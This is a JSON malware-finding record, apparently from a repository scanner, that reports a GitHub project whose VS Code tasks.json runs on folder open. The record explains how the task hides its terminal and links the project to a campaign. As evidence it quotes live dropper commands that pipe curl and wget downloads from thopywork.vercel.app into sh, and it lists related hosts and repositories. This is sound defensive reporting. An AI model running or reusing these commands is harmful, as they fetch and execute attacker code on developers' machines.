@@ -1,0 +1,67 @@
+{
+  "finding": {
+    "key": "repository:bhnybrohn/cal-eco-platform",
+    "kind": "repository",
+    "id": "bhnybrohn/cal-eco-platform",
+    "url": "https://github.com/bhnybrohn/cal-eco-platform",
+    "registry": "github",
+    "owner": "bhnybrohn",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 5,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "GW-C-a3717cc8",
+    "rules": "install_hook/vscode-autorun",
+    "evidence_locations": ".vscode/tasks.json:0",
+    "c2_hosts": "thopywork.vercel.app",
+    "iocs": "thopywork.vercel.app; https://thopywork.vercel.app/task/mac?token=90284f91ab73; https://thopywork.vercel.app/task/linux?token=90284f91ab73; https://thopywork.vercel.app/task/windows?token=90; curl 'https://thopywork.vercel.app/task/mac?token=90284f91ab73' | sh; .vscode/tasks.json",
+    "matched_signatures": "task/mac?token=; task/windows?token=",
+    "reasons": "Shares a confirmed-malware code signature ['task/mac?token=', 'task/windows?token='] | Tier-2 confirmed (bash score 5)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20261003T201851Z",
+    "last_seen": "hunt-20261003T201851Z",
+    "evidence_file": "repositories/bhnybrohn_cal-eco-platform.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://thopywork.vercel.app/task/mac?token=90284f91ab73' | sh wget -qO- 'https://thopywork.vercel.app/task/linux?token=90284f91ab73' | sh curl https://thopywork.vercel.app/task/windows?token=90"
+    },
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl 'https://thopywork.vercel.app/task/mac?token=90284f91ab73' | sh wget -qO- 'https://thopywork.vercel.app/task/linux?token=90284f91ab73' | sh curl https://thopywork.vercel.app/task/windows?token=90"
+    }
+  ],
+  "commit_sha": "1d8b505e696ceecb4190d62765d5a23feacfd6a8",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/bhnybrohn/cal-eco-platform",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: task/mac?token=; task/windows?token=. The delivery method, a .vscode/tasks.json task that automatically runs a remote shell command the moment the repository is opened in VS Code, matches the DPRK-attributed 'Contagious Interview' campaign, in which fake recruiters lure developers into opening a coding-task repository that silently executes a first-stage downloader. The payload is fetched from attacker-controlled infrastructure: thopywork.vercel.app. This repository is one of 10 that Git Warden has confirmed as campaign GW-C-a3717cc8, which all deliver the same dropper URL shape (task/{os}?token=). The campaign spans 10 GitHub accounts. The other confirmed repositories are: https://github.com/bsai/cal-eco-platform, https://github.com/cataclypsme/old-web3-project, https://github.com/cletusgizo/genetiq-v2--test-task, https://github.com/david1savitsky/cal-eco-platform, https://github.com/devthedeveloper/w3glpop, https://github.com/jaxteller2016/social-app-mvp-poker-cra, https://github.com/mentarishub121/tokenpresaleapp, https://github.com/shimul-12/token-presale-dapp, https://github.com/workonlly/interview_bucket. Across the campaign the payload is served from 6 distinct hosts: coreviewer.vercel.app, task-hrec.vercel.app, thopywork.vercel.app, vscode-config.vercel.app, vscode-production-setting.ve, vscode-production-setting.vercel.app. Matching only one host would miss most of the operation; matching the delivery shape found all of it. Attribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. The evidence behind this is: (1) Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun.",
+    "payload_description": "The malicious payload sits in .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. Detection rules that fired in this repository: install_hook/vscode-autorun (1 file).",
+    "publisher": "bhnybrohn",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/bhnybrohn/cal-eco-platform/blob/1d8b505e696ceecb4190d62765d5a23feacfd6a8/.vscode/tasks.json",
+    "verified_iocs": "thopywork.vercel.app\nhttps://thopywork.vercel.app/task/mac?token=90284f91ab73\nhttps://thopywork.vercel.app/task/linux?token=90284f91ab73\nhttps://thopywork.vercel.app/task/windows?token=90\ncurl 'https://thopywork.vercel.app/task/mac?token=90284f91ab73' | sh\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-10-03T20:18:51Z",
+    "last_seen": "2026-10-03T20:18:51Z"
+  }
+}
